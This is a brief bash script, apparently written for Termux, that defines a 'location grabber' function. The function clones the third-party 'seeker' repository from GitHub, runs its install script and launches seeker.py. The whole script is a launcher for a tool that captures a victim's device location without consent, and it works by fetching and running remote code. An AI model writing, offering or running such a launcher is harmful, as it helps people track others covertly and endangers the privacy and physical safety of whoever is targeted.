#!/bin/bash
grab_location() {
  echo "[*] Starting location grabber..."
  git clone https://github.com/thewhiteh4t/seeker /data/data/com.termux/files/home/seeker >/dev/null 2>&1
  cd seeker && bash termux_install.sh && python3 seeker.py
}
